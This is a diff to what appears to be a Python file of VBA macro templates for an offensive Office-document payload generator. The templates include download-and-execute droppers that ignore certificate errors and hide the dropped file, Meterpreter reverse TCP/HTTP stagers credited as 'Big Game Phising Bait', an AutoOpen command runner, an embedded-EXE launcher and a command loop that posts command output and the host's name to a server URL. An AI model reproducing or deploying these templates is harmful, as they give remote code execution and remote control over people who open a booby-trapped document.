@@ -21,12 +21,12 @@ DROPPER = \
 ' will override any other file with same name
 Private Sub DownloadAndExecute()
     Dim myURL As String
-    Dim realPath As String
+    Dim downloadPath As String
     Dim WinHttpReq As Object, oStream As Object
     Dim result As Integer
     
     myURL = "<<<URL>>>"
-    realPath = <<<DOWNLOAD_PATH>>>
+    downloadPath = <<<DOWNLOAD_PATH>>>
     
     Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     WinHttpReq.setOption(2) = 13056 ' Ignore cert errors
@@ -39,9 +39,9 @@ Private Sub DownloadAndExecute()
         oStream.Open
         oStream.Type = 1
         oStream.Write WinHttpReq.ResponseBody
-        oStream.SaveToFile realPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
+        oStream.SaveToFile downloadPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
         oStream.Close
-        ExecuteCmdAsync realPath
+        ExecuteCmdAsync downloadPath
     End If    
     
 End Sub
@@ -61,14 +61,14 @@ DROPPER2 = \
 ' will override any other file with same name
 Private Sub DownloadAndExecute()
     Dim myURL As String
-    Dim realPath As String
+    Dim downloadPath As String
     Dim WinHttpReq As Object, oStream As Object
     Dim result As Integer
     
     myURL = "<<<URL>>>"
-    realPath = "<<<DOWNLOAD_PATH>>>"
+    downloadPath = "<<<DOWNLOAD_PATH>>>"
     
-    If Dir(realPath, vbHidden + vbSystem) = "" Then
+    If Dir(downloadPath, vbHidden + vbSystem) = "" Then
         Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
         WinHttpReq.setOption(2) = 13056 ' Ignore cert errors
         WinHttpReq.Open "GET", myURL, False ', "username", "password"
@@ -81,10 +81,10 @@ Private Sub DownloadAndExecute()
             oStream.Type = 1
             oStream.Write WinHttpReq.ResponseBody
             
-            oStream.SaveToFile realPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
+            oStream.SaveToFile downloadPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
             oStream.Close
-            SetAttr realPath, vbReadOnly + vbHidden + vbSystem
-            ExecuteCmdAsync realPath
+            SetAttr downloadPath, vbReadOnly + vbHidden + vbSystem
+            ExecuteCmdAsync downloadPath
         End If
        
     End If
@@ -262,7 +262,6 @@ Private Sub loadEmbeddedDll()
     If Dir(dll_Loc, vbDirectory) = vbNullString Then
         Exit Sub
     End If
-    ChDir dll_Loc
     DumpFile "Document1.asd"
     <<<MODULE_2>>>.Invoke 
 End Sub
@@ -277,6 +276,21 @@ End Sub
 
 METERPRETER =  \
 r"""
+'   _____                                _____          __
+'  /     \ _____    ___________  ____   /     \   _____/  |_  ___________
+' /  \ /  \\__  \ _/ ___\_  __ \/  _ \ /  \ /  \_/ __ \   __\/ __ \_  __ \
+'/    Y    \/ __ \\  \___|  | \(  <_> )    Y    \  ___/|  | \  ___/|  | \/
+'\____|__  (____  /\___  >__|   \____/\____|__  /\___  >__|  \___  >__|
+'        \/     \/     \/                     \/     \/          \/
+
+'                       Metasploit Big Game Phising Bait - by Cn33liz 2017
+
+' Original Repo: https://github.com/Cn33liz/MacroMeter
+
+'VBA Reversed TCP Meterpreter Stager
+'CSharp Meterpreter Stager build by Cn33liz and embedded within VBA using DotNetToJScript from James Forshaw
+'https://github.com/tyranid/DotNetToJScript
+
 
 Public RHOST As String 
 Public RPORT As String
@@ -309,6 +323,18 @@ exploit -j
 
 WEBMETER =  \
 r"""
+'____   ______________  ___________      __      ___.       _____          __                
+'\   \ /   /\______   \/   _____/  \    /  \ ____\_ |__    /     \   _____/  |_  ___________ 
+' \   Y   /  |    |  _/\_____  \\   \/\/   // __ \| __ \  /  \ /  \_/ __ \   __\/ __ \_  __ \
+'  \     /   |    |   \/        \\        /\  ___/| \_\ \/    Y    \  ___/|  | \  ___/|  | \/
+'   \___/    |______  /_______  / \__/\  /  \___  >___  /\____|__  /\___  >__|  \___  >__|   
+'                   \/        \/       \/       \/    \/         \/     \/          \/       
+
+'VBScript Reversed HTTP/HTTPS Meterpreter Stager - by Cn33liz 2017
+'CSharp Meterpreter Stager build by Cn33liz and embedded within VBScript using DotNetToJScript from James Forshaw
+'https://github.com/tyranid/DotNetToJScript
+
+'This Stager is Proxy aware and should run on x86 as well as x64
 
 Public RHOST As String 
 Public RPORT As String
@@ -343,14 +369,11 @@ exploit -j
 
 EMBED_EXE = \
 r"""
+'Option Explicit
 
 Private Sub executeEmbed()
-    Dim fileName As String
-    fileName = "\<<<FILE_NAME>>>"
-    Dim fullPath As String
-    fullPath = Environ("TEMP") & fileName
-    DumpFile fullPath
-    ExecuteCmdAsync fullPath <<<PARAMETERS>>>
+    DumpFile "<<<OUT_FILE>>>"
+    ExecuteCmdAsync "<<<OUT_FILE>>>"
 End Sub
 
 ' Auto launch when VBA enabled
@@ -364,7 +387,7 @@ CMD = \
 r"""
 
 Sub AutoOpen()
-    ExecuteCmdAsync "<<<CMDLINE>>>"
+    ExecuteCmdAsync "<<<CMD>>>"
 End Sub
 
 """
@@ -385,8 +408,6 @@ Private Sub Main()
     msg = "<<<TEMPLATE>>>"
     On Error GoTo byebye
     msg = ExecuteCmdSync(msg)
-    On Error Resume Next
-    Err.Clear
     SendResponse msg
     On Error GoTo 0
     byebye:
@@ -412,18 +433,15 @@ End Function
 Private Function GetId() As String
     Dim myInfo As String
     Dim myID As String
-    myID = Environ("COMPUTERNAME") & "(" & Environ("USERDOMAIN")
-    myInfo = myID & ")"
-    GetId = myInfo
+    myID = Environ("COMPUTERNAME") & " " & Environ("OS")
+    GetId = myID
 End Function
 
 'To send response for command'
 Private Function SendResponse(cmdOutput)
     Dim data As String
     Dim response As String
-    Dim hostId As String
-    hostId = GetId()
-    data = "id=" &  hostId &  "&cmdOutput=" & cmdOutput
+    data = "id=" & GetId  & "&cmdOutput=" & cmdOutput
     SendResponse = HttpPostData(serverUrl, data)
 End Function
 
